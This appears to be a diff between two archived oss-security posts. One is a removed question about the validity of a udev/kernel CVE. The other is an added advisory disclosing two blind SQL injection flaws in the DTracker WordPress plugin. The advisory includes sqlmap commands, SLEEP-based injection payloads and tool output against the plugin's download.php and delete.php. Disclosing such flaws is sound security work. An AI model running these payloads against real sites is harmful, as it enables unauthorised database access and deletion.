@@ -1,40 +1,73 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/04/19/3
-Message-ID: <20170419092124.GA9609@suse.de>
-Date: Wed, 19 Apr 2017 11:21:24 +0200
-From: Sebastian Krahmer <krahmer@...e.com>
-To: oss-security@...ts.openwall.com
-Cc: cve-assign@...re.org
-Subject: CVE-2017-7874 versus CVE-2009-1185 ?
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/03/09/3
+Message-id: <C3D0A2F5-941D-4030-9910-57C3E46053E1@me.com>
+Date: Thu, 09 Mar 2017 07:57:13 -0500
+From: "Larry W. Cashdollar" <larry0@...com>
+To: Open Source Security <oss-security@...ts.openwall.com>
+Subject: Multiple Blind SQL injection vulnerability in Wordpress Plugin DTracker v1.5
 Content-Type: text/plain; charset=utf-8
 
-Hi
+Title: Multiple Blind SQL injection vulnerability in Wordpress Plugin DTracker v1.5
+Author: Larry W. Cashdollar, @_larry0
+Date: 2017-03-08
+CVE-IDs: CVE-2017-1002004 CVE-2017-1002005
+Download Site: https://wordpress.org/plugins/dtracker/
+Vendor: https://profiles.wordpress.org/dijo/
+Vendor Notified: 2017-03-08
+Vendor Contact: plugins@...dpress.org
+Advisory: http://www.vapidlabs.com/advisory.php?v=183
+Description: Track the details of the users downloading the pdf files from wordpress site.
+Vulnerability:
+CVE-2017-1002004:
+In file ./dtracker/download.php user input isn't sanitized via the id variable before adding it to the end of an SQL query.
+
+$doc_id         = $_GET['id'];
+$file = $wpdb->get_results( "SELECT * FROM wp_posts WHERE ID = $doc_id " );
+
+The user does not need to be authenticated to the Wordpress installation to exploit this vulnerability.
+
+CVE-2017-1002005:
+In file ./dtracker/delete.php user input isn't sanitized via the contact_id variable before adding it to the end of an SQL query.
+
+$contact_id     = $_POST['contact_id']; //Contact ID to be deleted
+
+$query  = "DELETE FROM wp_contacts WHERE id = $contact_id";
+$wpdb->query($query); // Delete the contact
+
+The user does not need to be authenticated to the Wordpress installation to exploit this vulnerability.
+
+Exploit Code:
+	• $ sqlmap -u 'http://example.com/wordpress/wp-content/plugins/dtracker/download.php?id=*'  --dbms mysql  --level 3 --risk 3
+	• URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
+	• sqlmap identified the following injection point(s) with a total of 1410 HTTP(s) requests:
+	• ---
+	• Parameter: #1* (URI)
+	•     Type: AND/OR time-based blind
+	•     Title: MySQL >= 5.0.12 time-based blind - Parameter replace
+	•     Payload: http://192.168.0.169:80/wordpress/wp-content/plugins/dtracker/download.php?id=(CASE WHEN (7148=7148) THEN SLEEP(5) ELSE 7148 END)
+	• ---
+	• [10:14:09] [INFO] the back-end DBMS is MySQL
+	• web server operating system: Linux Ubuntu 16.04 (xenial)
+	• web application technology: Apache 2.4.18
+	• back-end DBMS: MySQL >= 5.0.12
+	• [10:14:09] [WARNING] HTTP error codes detected during run:
+	• 404 (Not Found) - 14 times
+	• [10:14:09] [INFO] fetched data logged to text files under '/home/larry/.sqlmap/output/example.com'
+	
 
 
-I stumbled across https://twitter.com/info_dox/status/854372066228932609
-that is curious about an udev+kernel exploit
-(https://packetstormsecurity.com/files/142152/Linux-Kernel-4.8.0-udev-232-Privilege-Escalation.html)
-
-which claims to exploit a missing sender-check within udev. That makes
-me wonder, as kernel 4.8.0 (and even earlier) no longer allow users
-to send NETLINK_KOBJECT_UEVENT messages. Our testcases fail,
-as they should:
-
-https://bugzilla.suse.com/show_bug.cgi?id=1034330
-
-
-However, MITRE apparently assigned a valid CVE for it:
-
-http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7874
-
-So either we miss some weird corner case or the CVE is invalid
-and should be withdrawn?
-
-Sebastian
-
--- 
-
-~ perl self.pl
-~ $_='print"\$_=\47$_\47;eval"';eval
-~ krahmer@...e.com - SuSE Security Team
-
+	• $ sqlmap -u 'http://example.com/wordpress/wp-content/plugins/dtracker/delete.php' --data 'contact_id=*'  --dbms mysql --risk 1 --level 3
+	•  
+	• (custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
+	• sqlmap identified the following injection point(s) with a total of 831 HTTP(s) requests:
+	• ---
+	• Parameter: #1* ((custom) POST)
+	•     Type: AND/OR time-based blind
+	•     Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
+	•     Payload: contact_id=(SELECT * FROM (SELECT(SLEEP(5)))Vtrh)
+	• ---
+	• [11:53:27] [INFO] the back-end DBMS is MySQL
+	• web server operating system: Linux Ubuntu 16.04 (xenial)
+	• web application technology: Apache 2.4.18
+	• back-end DBMS: MySQL >= 5.0.12
+	• [11:53:27] [INFO] fetched data logged to text files under '/home/larry/.sqlmap/output/example.com'
